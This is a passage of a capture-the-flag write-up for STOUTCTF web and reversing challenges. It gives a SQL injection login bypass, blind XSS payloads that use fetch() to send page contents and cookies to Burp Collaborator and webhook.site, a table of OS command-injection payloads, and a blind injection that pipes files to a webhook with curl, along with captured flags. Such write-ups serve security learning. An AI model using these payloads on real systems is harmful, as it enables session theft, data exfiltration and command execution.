SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```
Example After:
```
SELECT * FROM users WHERE username = 'admin' or '1'='1' AND password = 'password';
```

Payload: ``admin’ or ‘1’=’1``

Upon succeded, the flag will be pop.

```

```







### Mr Bean's Little Beans

Fuzzing all the site using dirb or gobuster depends on the convenience. In this example im using dirb and found the admin directory that wasn’t shown on the hosted site.

| URL: | 
|---|
web/MrBean/admin | 
|---|


```bash
$ curl https://ctf.oplabs.us/web/MrBean/admin/ | grep "STOUT"
  <p>STOUTCTF{W9du9uMYcyjoNQKeJpKr6c6m1BXAxbXC}</p>
```


### Crossing Seven Sea

Blind XSS try out one by one payload using this references: ``https://github.com/lauritzh/blind-xss-payloads``
and found one payload that works. which is:
```
<input onfocus='fetch("https://example.burpcollaborator.net/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>
```

Now we can use it in the messages section and obtain the cookie with the payload:
```
<input onfocus='fetch("https://webhook.site/107d6ce8-fc36-4c6e-bf5b-585461b6f297?c="+btoa(document.cookie),{method:"POST",mode:"no-cors"})' autofocus>
```

(can use webhook.site to obtain the hook or ngrok depends whatever you like)

```

```



### Whois lvl1
Theres so multiple injection can be used example ``|`` . Here other example list what can be used:

| Form-select            | Payload              |
|------------------------|----------------------|
| nslookup               | ; cat flag.txt       |
| nslookup               | & cat flag.txt       |
| nslookup               | && cat flag.txt      |
| nslookup               | `cat flag.txt`       |
| ping                   | 0.0.0.0 && cat flag.txt |
| ping 0.0.0.0           | cat ; flag.txt       |
| ping                   | 0.0.0.0 & cat flag.txt  |
| dig                    | ; cat flag.txt       |
| dig                    | & cat flag.txt       |
| dig                    | && cat flag.txt      |
| dig                    | `cat flag.txt`       |


Why did it happen? The failure to validate inputs before using them in functions that invoke OS-level commands, such as exec(), system(), or shell scripting constructs. As a result, we can exploit the application by appending the os command.

In this example i will use:
```
0.0.0.0; cat flag.txt
```

```
STOUTCTF{6GmWewZFLZqlsEmSxeHehXCMajEEI9IX}
```




### Whois lvl2

This time im using ``|`` to get the flag.

```
0.0.0.0 | cat flag.txt
```

```
STOUTCTF{tCoW5voLpV44AsdzOigETrE3IZMHVBV6}
```


### Whois lvl3

Using '`' and the command on the dig section.

Payload:
```
`cat flag.txt`
```

```
STOUTCTF{18kUctpnd5aze563mm2uMBbWL7CT1A2e}
```



### Whois lvl4

Since other functions like ping, dnslookup, and dig couldn't be used, I decided to attempt a ``blind OS injection`` on the backup section using the curl function. By doing this, I was able to observe the response on the ``webhook site``. This confirmed that the `|` (pipe) operator was functional. I then proceeded to send a ``POST`` request to read everything inside the current directory.

On ``Backup`` Payload:
```
| cat * | curl -X POST -d @- https://webhook.site/107d6ce8-fc36-4c6e-bf5b-585461b6f297
```
Check the webhook site, we get to see the flag has been bounce back to us

### Bossman

While trying to analyze the program in DNSpy, I couldn't find anything useful. I then booted up `Cutter` and encountered some `Base64` encoded data. Since I couldn't see the program properly in either `DNSpy` or `ILSpy`, I decided to explore alternative tools.


After trying ``dotPeek``, a tool designed for ``.NET Framework`` programs, I was able to view the source code clearly. This allowed me to decode the data and eventually obtain the flag.

```
import base64

def get_time():
    ch_array1 = ['U', '1', 'R', 'P']
    ch_array2 = ['V', 'V', 'R', 'D']
    ch_array3 = ['V', 'E', 'Z', '7']
    char_array1 = "VGZSVDBsWW9nUjRWa3ZDaEdab2tS"
    char_array2 = "MkFmR2ZUQ0p2SEh9"

    string_builder = []

    string_builder.extend(ch_array1)
    string_builder.extend(ch_array2)
    string_builder.extend(ch_array3)

    base64_encoded_char_array1 = base64.b64encode(char_array1.encode('utf-8')).decode('utf-8')
    string_builder.append(base64_encoded_char_array1[:len(char_array1)])

    string_builder.append(char_array2)

    return ''.join(string_builder)

result = get_time()
print(result)
```

```bash
$ python solver.py
U1RPVVRDVEZ7VkdaU1ZEQnNXVzluVWpSV2EzWkRhMkFmR2ZUQ0p2SEh9

$ python solver.py | base64 -d
